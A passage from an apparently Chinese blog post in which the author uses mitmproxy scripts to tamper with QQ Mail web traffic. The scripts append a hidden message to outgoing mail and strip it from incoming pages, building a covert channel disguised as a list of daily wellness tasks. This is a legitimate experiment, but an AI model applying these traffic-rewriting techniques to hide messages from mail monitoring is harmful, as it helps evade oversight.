charset=gb18030&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>今日指令 - QQ邮箱<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 此处省略一堆script、style、meta --&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span> <span class="attr">context</span>=<span class="string">&quot;邮件ID&quot;</span> <span class="attr">module</span>=<span class="string">&quot;qmReadMail&quot;</span> <span class="attr">md</span>=<span class="string">&quot;md&quot;</span> <span class="attr">mu</span>=<span class="string">&quot;mu&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;mailcontainer&quot;</span> <span class="attr">id</span>=<span class="string">&quot;qqmail_mailcontainer&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;mainmail&quot;</span> <span class="attr">style</span>=<span class="string">&quot;position:relative;z-index:1;margin-bottom:12px;&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;contentDiv&quot;</span> <span class="attr">onmouseover</span>=<span class="string">&quot;getTop().stopPropagation(event);&quot;</span> <span class="attr">onClick</span>=<span class="string">&quot;getTop().preSwapLink(event, &#x27;html&#x27;, &#x27;ZC0006_StHNHHSMYOYuV2cAGA~jBf3&#x27;);&quot;</span> <span class="attr">style</span>=<span class="string">&quot;position:relative;font-size:14px;height:auto;padding:15px 15px 10px 15px;z-index:1;zoom:1;line-height:1.7;&quot;</span> <span class="attr">class</span>=<span class="string">&quot;body&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;qm_con_body&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;mailContentContainer&quot;</span> <span class="attr">onClick</span>=<span class="string">&quot;getTop().previewContentImage(event, &#x27;&#x27;)&quot;</span> <span class="attr">onMousemove</span>=<span class="string">&quot;getTop().contentImgMouseOver(event, &#x27;&#x27;)&quot;</span> <span class="attr">onMouseout</span>=<span class="string">&quot;getTop().contentImgMouseOut(event, &#x27;&#x27;)&quot;</span> <span class="attr">class</span>=<span class="string">&quot;qmbox qm_con_body_content qqmail_webmail_only&quot;</span> <span class="attr">style</span>=<span class="string">&quot;opacity: 0&quot;</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;mailcontent_image_operator&quot;</span> <span class="attr">onMouseover</span>=<span class="string">&quot;getTop().contentOperatorMouseOver(event)&quot;</span> <span class="attr">onClick</span>=<span class="string">&quot;getTop().handleOperatorClick(event)&quot;</span> <span class="attr">style</span>=<span class="string">&quot;position: fixed; left: 0; top: 0;&quot;</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;operator-item&quot;</span> <span class="attr">title</span>=<span class="string">&quot;图片翻译&quot;</span> <span class="attr">id</span>=<span class="string">&quot;operator-item-translate&quot;</span> <span class="attr">operate</span>=<span class="string">&quot;translate&quot;</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;item-inner&quot;</span> <span class="attr">operate</span>=<span class="string">&quot;translate&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;operator-item&quot;</span> <span class="attr">title</span>=<span class="string">&quot;文字提取&quot;</span> <span class="attr">id</span>=<span class="string">&quot;operator-item-extract&quot;</span> <span class="attr">operate</span>=<span class="string">&quot;extract&quot;</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;item-inner&quot;</span> <span class="attr">operate</span>=<span class="string">&quot;extract&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;operator-item&quot;</span> <span class="attr">title</span>=<span class="string">&quot;导出表格&quot;</span> <span class="attr">id</span>=<span class="string">&quot;operator-item-form&quot;</span> <span class="attr">operate</span>=<span class="string">&quot;form&quot;</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;item-inner&quot;</span> <span class="attr">operate</span>=<span class="string">&quot;form&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;operator-item&quot;</span> <span class="attr">title</span>=<span class="string">&quot;下载图片&quot;</span> <span class="attr">id</span>=<span class="string">&quot;operator-item-download&quot;</span> <span class="attr">operate</span>=<span class="string">&quot;download&quot;</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;item-inner&quot;</span> <span class="attr">operate</span>=<span class="string">&quot;download&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">                                <span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;DOMContentLoaded&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                                    <span class="title function_">getTop</span>().<span class="title function_">handleScanContentImage</span>(<span class="string">&#x27;ZC0006_StHNHHSMYOYuV2cAGA~jBf3&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">                                &#125;)</span></span><br><span class="line"><span class="language-javascript">                            </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">                                <span class="comment">/* 邮件内部图片支持调起预览。 */</span></span></span><br><span class="line"><span class="language-css">                                <span class="selector-tag">img</span><span class="selector-attr">[image-inside-content=<span class="string">&#x27;1&#x27;</span>]</span> &#123;</span></span><br><span class="line"><span class="language-css">                                    <span class="attribute">cursor</span>: pointer;</span></span><br><span class="line"><span class="language-css">                                &#125;</span></span><br><span class="line"><span class="language-css">                            </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">                            一切正常，和昨天一样<span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">                                <span class="selector-class">.qmbox</span> style, <span class="selector-class">.qmbox</span> script, <span class="selector-class">.qmbox</span> head, <span class="selector-class">.qmbox</span> link, <span class="selector-class">.qmbox</span> meta &#123;</span></span><br><span class="line"><span class="language-css">                                    <span class="attribute">display</span>: none <span class="meta">!important</span>;</span></span><br><span class="line"><span class="language-css">                                &#125;</span></span><br><span class="line"><span class="language-css">                            </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                    <span class="comment">&lt;!-- --&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">                        <span class="selector-id">#mailContentContainer</span> <span class="selector-class">.txt</span> &#123;</span></span><br><span class="line"><span class="language-css">                            <span class="attribute">height</span>: auto;</span></span><br><span class="line"><span class="language-css">                        &#125;</span></span><br><span class="line"><span class="language-css">                    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 此处省略一堆script --&gt;</span></span><br></pre></td></tr></table></figure>

<p>发送的邮件主体就出现在简化后的HTML的第38行。</p>
<p>在研究期间还看到了一个有点意思的图，mark一下：</p>
<p class='item-img' data-src='https://cors.letmefly.xyz/https://i-blog.csdnimg.cn/direct/9cfd3e3e48c641f4a12a7a82cd53c44f.png'><img src="https://cors.letmefly.xyz/https://i-blog.csdnimg.cn/direct/9cfd3e3e48c641f4a12a7a82cd53c44f.png" alt="stream"></p>
<!-- ![stream](../../binaryFiles/pics/20250308/stream.png) -->

<h3 id="消息验证-发送邮件时后台篡改"><a href="#消息验证-发送邮件时后台篡改" class="headerlink" title="消息验证 - 发送邮件时后台篡改"></a>消息验证 - 发送邮件时后台篡改</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> mitmproxy <span class="keyword">import</span> http</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> parse_qs, urlencode</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"></span><br><span class="line">logger_url = logging.getLogger(<span class="string">&#x27;logger_url&#x27;</span>)</span><br><span class="line">formatter_url = logging.Formatter(<span class="string">&#x27;%(asctime)s - %(name)s - %(levelname)s - %(message)s&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> handler <span class="keyword">in</span> logger_url.handlers[:]:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(handler, logging.StreamHandler):</span><br><span class="line">        logger_url.removeHandler(handler)</span><br><span class="line">logger_url.setLevel(logging.DEBUG)</span><br><span class="line">filehandler_url = logging.FileHandler(<span class="string">&#x27;url.log&#x27;</span>)</span><br><span class="line">filehandler_url.setFormatter(formatter_url)</span><br><span class="line">logger_url.addHandler(filehandler_url)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AddSignatureAddon</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">request</span>(<span class="params">self, flow: http.HTTPFlow</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="comment"># 检查目标路径和请求方法</span></span><br><span class="line">        <span class="keyword">if</span> flow.request.method == <span class="string">&quot;POST&quot;</span> <span class="keyword">and</span> <span class="string">&quot;/cgi-bin/compose_send&quot;</span> <span class="keyword">in</span> flow.request.url:</span><br><span class="line">            <span class="comment"># 确保Content-Type正确</span></span><br><span class="line">            content_type = flow.request.headers.get(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;application/x-www-form-urlencoded&quot;</span> <span class="keyword">in</span> content_type:</span><br><span class="line">                <span class="comment"># 解析原始表单数据</span></span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    parsed_data = parse_qs(flow.request.content.decode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">                <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                    logger_url(<span class="string">f&quot;解析表单数据失败: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">                <span class="comment"># 修改content__html字段</span></span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;content__html&quot;</span> <span class="keyword">in</span> parsed_data <span class="keyword">and</span> parsed_data[<span class="string">&quot;content__html&quot;</span>]:</span><br><span class="line">                    original_content = parsed_data[<span class="string">&quot;content__html&quot;</span>][<span class="number">0</span>]</span><br><span class="line">                    new_content = original_content + <span class="string">&quot;*******计划有变*******&quot;</span></span><br><span class="line">                    parsed_data[<span class="string">&quot;content__html&quot;</span>][<span class="number">0</span>] = new_content</span><br><span class="line"></span><br><span class="line">                    <span class="comment"># 重新编码并更新请求内容</span></span><br><span class="line">                    updated_content = urlencode(parsed_data, doseq=<span class="literal">True</span>).encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">                    flow.request.content = updated_content</span><br><span class="line">                    logger_url(<span class="string">&quot;成功添加签名！&quot;</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    logger_url(<span class="string">&quot;未找到content__html字段&quot;</span>)</span><br><span class="line"></span><br><span class="line">addons = [AddSignatureAddon()]</span><br></pre></td></tr></table></figure>

<p>设置代理服务器为<code>localhost:8080</code>，然后：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mitmproxy -s modifyPackage.py --listen-host localhost</span><br></pre></td></tr></table></figure>

<p>发送邮件，可以看到网页端没有任何异常，浏览器控制台也一切正常。</p>
<p>但是实际发出的邮件就不一样了，多了一段<code>*******签名*******</code></p>
<p class='item-img' data-src='https://cors.letmefly.xyz/https://i-blog.csdnimg.cn/direct/05238e8a521644abacb6decabde5dc7b.png'><img src="https://cors.letmefly.xyz/https://i-blog.csdnimg.cn/direct/05238e8a521644abacb6decabde5dc7b.png" alt="实际邮件"></p>
<!-- ![实际邮件](../../binaryFiles/pics/20250308/realEmail.png) -->

<h3 id="消息验证-收到邮件时后台篡改"><a href="#消息验证-收到邮件时后台篡改" class="headerlink" title="消息验证 - 收到邮件时后台篡改"></a>消息验证 - 收到邮件时后台篡改</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">response</span>(<span class="params">self, flow: http.HTTPFlow</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">if</span> flow.request.method == <span class="string">&#x27;GET&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;/cgi-bin/readmail&#x27;</span> <span class="keyword">in</span> flow.request.url:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;text/html&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> flow.response.headers.get(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;&quot;</span>):</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="comment"># 解析HTML</span></span><br><span class="line">        soup = BeautifulSoup(flow.response.content, <span class="string">&quot;lxml&quot;</span>)</span><br><span class="line">        content_div = soup.find(<span class="string">&quot;div&quot;</span>, &#123;<span class="string">&quot;id&quot;</span>: <span class="string">&quot;mailContentContainer&quot;</span>&#125;)</span><br><span class="line">        logger.info(<span class="string">f&#x27;<span class="subst">&#123;content_div&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> content_div:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 提取所有文本节点</span></span><br><span class="line">        text_nodes = content_div.find_all(text=<span class="literal">True</span>, recursive=<span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">for</span> node <span class="keyword">in</span> text_nodes:</span><br><span class="line">            <span class="comment"># 匹配签名模式（支持动态内容）</span></span><br><span class="line">            <span class="keyword">match</span> = re.search(<span class="string">r&#x27;\*&#123;7&#125;(.*?)\*&#123;7&#125;&#x27;</span>, node.string)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">                signature = <span class="keyword">match</span>.group(<span class="number">1</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;提取到签名：<span class="subst">&#123;signature&#125;</span>&quot;</span>)</span><br><span class="line">                clean_text = re.sub(<span class="string">r&#x27;\*&#123;7&#125;.*?\*&#123;7&#125;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, node.string)</span><br><span class="line">                node.replace_with(clean_text)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 更新响应内容</span></span><br><span class="line">        flow.response.content = <span class="built_in">str</span>(soup).encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">        flow.response.headers[<span class="string">&quot;Content-Length&quot;</span>] = <span class="built_in">str</span>(<span class="built_in">len</span>(flow.response.content))</span><br></pre></td></tr></table></figure>

<p>等下，篡改失败了？</p>
<p>仔细一看，response中有这么一段：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html; charset=gb18030&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<p>logging的日志也显示乱码。</p>
<p>通过解码后能正常解析并修改原文内容了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">response</span>(<span class="params">self, flow: http.HTTPFlow</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">if</span> flow.request.method == <span class="string">&#x27;GET&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;/cgi-bin/readmail&#x27;</span> <span class="keyword">in</span> flow.request.url:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;text/html&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> flow.response.headers.get(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;&quot;</span>):</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            html_content = flow.response.content.decode(<span class="string">&quot;gb18030&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> UnicodeDecodeError:</span><br><span class="line">            logger.info(<span class="string">&#x27;解码失败：可能不是GB18030编码&#x27;</span>)</span><br><span class="line">        soup = BeautifulSoup(html_content, <span class="string">&quot;lxml&quot;</span>)</span><br><span class="line">        content_div = soup.find(<span class="string">&quot;div&quot;</span>, &#123;<span class="string">&quot;id&quot;</span>: <span class="string">&quot;mailContentContainer&quot;</span>&#125;)</span><br><span class="line">        logger.info(<span class="string">f&#x27;<span class="subst">&#123;content_div&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> content_div:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 提取所有文本节点</span></span><br><span class="line">        text_nodes = content_div.find_all(text=<span class="literal">True</span>, recursive=<span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">for</span> node <span class="keyword">in</span> text_nodes:</span><br><span class="line">            <span class="comment"># 匹配签名模式（支持动态内容）</span></span><br><span class="line">            <span class="keyword">match</span> = re.search(<span class="string">r&#x27;\*&#123;7&#125;(.*?)\*&#123;7&#125;&#x27;</span>, node.string)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">                signature = <span class="keyword">match</span>.group(<span class="number">1</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;提取到签名：<span class="subst">&#123;signature&#125;</span>&quot;</span>)</span><br><span class="line">                clean_text = re.sub(<span class="string">r&#x27;\*&#123;7&#125;.*?\*&#123;7&#125;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, node.string)</span><br><span class="line">                node.replace_with(clean_text)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 更新响应内容</span></span><br><span class="line">        flow.response.content = <span class="built_in">str</span>(soup).encode(<span class="string">&quot;gb18030&quot;</span>)</span><br><span class="line">        flow.response.headers[<span class="string">&quot;Content-Length&quot;</span>] = <span class="built_in">str</span>(<span class="built_in">len</span>(flow.response.content))</span><br></pre></td></tr></table></figure>

<p>但是通过抓包可以发现，通过beautifulsoup解析html并重新编码html，产生内容还是会稍有不同：</p>
<ol>
<li><p>header：原始编码为<code>gb18030</code>，但decode并由BS解析后就变成了<code>utf-8</code></p>
<p> 原来：</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html; charset=gb18030&quot;</span>/&gt;</span></span><br><span class="line">````</span><br><span class="line"></span><br><span class="line">解析后：</span><br><span class="line"></span><br><span class="line">```html</span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">content</span>=<span class="string">&quot;text/html; charset=utf-8&quot;</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Type&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>有些细节和原来内容不完全一致</p>
<p> 例如1.中的顺序，原来是先<code>http-equiv</code>后<code>content</code>，结果变成了先<code>content</code>后<code>http-equiv</code></p>
<p> 还有的<code>&amp;nbsp;</code>会被直接由空格代替。</p>
</li>
</ol>
<p>解决方法有二：</p>
<ol>
<li>令BS树的编码方式为gb18030</li>
<li>不BS树，直接用正则解析</li>
</ol>
<p>使用方法一：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">meta_tag = soup.find(<span class="string">&quot;meta&quot;</span>, attrs=&#123;<span class="string">&quot;http-equiv&quot;</span>: <span class="string">&quot;Content-Type&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">if</span> meta_tag:</span><br><span class="line">    meta_tag[<span class="string">&quot;content&quot;</span>] = <span class="string">&quot;text/html; charset=gb18030&quot;</span></span><br></pre></td></tr></table></figure>

<p>抓包发现meta content的内容正常了，但邮件直接全部不显示。</p>
<p>肉眼可见BS对原文内容进行了很多修改，于是决定使用方案二</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    html_content = flow.response.content.decode(<span class="string">&quot;gb18030&quot;</span>)</span><br><span class="line"><span class="keyword">except</span> UnicodeDecodeError:</span><br><span class="line">    logger.info(<span class="string">&#x27;解码失败：可能不是GB18030编码&#x27;</span>)</span><br><span class="line"><span class="keyword">match</span> = re.search(<span class="string">r&#x27;\*&#123;7&#125;(.*?)\*&#123;7&#125;&#x27;</span>, html_content)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">    signature = <span class="keyword">match</span>.group(<span class="number">1</span>)</span><br><span class="line">    logger.info(<span class="string">f&quot;提取到签名：<span class="subst">&#123;signature&#125;</span>&quot;</span>)</span><br><span class="line">    html_content = re.sub(<span class="string">r&#x27;\*&#123;7&#125;.*?\*&#123;7&#125;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, html_content)</span><br><span class="line">flow.response.content = html_content.encode(<span class="string">&quot;gb18030&quot;</span>)</span><br><span class="line">flow.response.headers[<span class="string">&quot;Content-Length&quot;</span>] = <span class="built_in">str</span>(<span class="built_in">len</span>(flow.response.content))</span><br></pre></td></tr></table></figure>

<p>然后功能实现了</p>
<p class='item-img' data-src='https://cors.letmefly.xyz/https://i-blog.csdnimg.cn/direct/308711a1afdb43548e07ece916e7cc62.png'><img src="https://cors.letmefly.xyz/https://i-blog.csdnimg.cn/direct/308711a1afdb43548e07ece916e7cc62.png" alt="没有隐藏信息"></p>
<!-- ![没有隐藏信息](../../binaryFiles/pics/20250308/noHiddenMessage.png) -->

<h3 id="展示工作"><a href="#展示工作" class="headerlink" title="展示工作"></a>展示工作</h3><p>所有所需功能已经实现，接下来就是演示了。</p>
<p>发送端：一个小黑框，接收想要隐蔽传递的信息</p>
<p>接收端：一个小黑框，显示接收到的隐藏信息</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">今日指令</span><br><span class="line"></span><br><span class="line">今日跑步挑战：今天每人跑步10000米，保持健康，突破自我！</span><br><span class="line">（记录时间：，完成情况：）</span><br><span class="line"></span><br><span class="line">今日阅读任务：今天每人阅读50页书，提升知识储备，开阔视野。</span><br><span class="line">（书名：，进度：）</span><br><span class="line"></span><br><span class="line">今日饮水目标：今天每人饮水2000毫升，保持身体水分平衡。</span><br><span class="line">（完成杯数：，剩余目标：）</span><br><span class="line"></span><br><span class="line">今日学习时间：今天每人学习2小时，专注于技能提升或兴趣培养。</span><br><span class="line">（学习内容：，完成情况：）</span><br><span class="line"></span><br><span class="line">今日冥想练习：今天每人冥想15分钟，放松身心，提升专注力。</span><br><span class="line">（冥想主题：，感受：）</span><br><span class="line"></span><br><span class="line">今日写作任务：今天每人写作500字，记录生活或创作故事。</span><br><span class="line">（写作主题：，完成字数：）</span><br><span class="line"></span><br><span class="line">今日蔬果摄入：今天每人摄入5份蔬果，保持均衡饮食。</span><br><span class="line">（蔬果种类：，完成份数：）</span><br><span class="line"></span><br><span class="line">今日早睡目标：今天每人晚上10点前入睡，保证充足睡眠。</span><br><span class="line">（实际入睡时间：，睡眠质量：）</span><br><span class="line"></span><br><span class="line">今日感恩记录：今天每人记录3件值得感恩的事，培养积极心态。</span><br><span class="line">（感恩事项：1.____ 2.____ 3.____）</span><br><span class="line"></span><br><span class="line">今日运动打卡：今天每人完成30分钟运动，形式不限（跑步、瑜伽、健身等）。</span><br><span class="line">（运动类型：，完成时长：）</span><br></pre></td></tr></table></figure>

<h3 id="最终代码"><a href="#最终代码" class="headerlink" title="最终代码"></a>最终代码</h3><p>改包：</p>
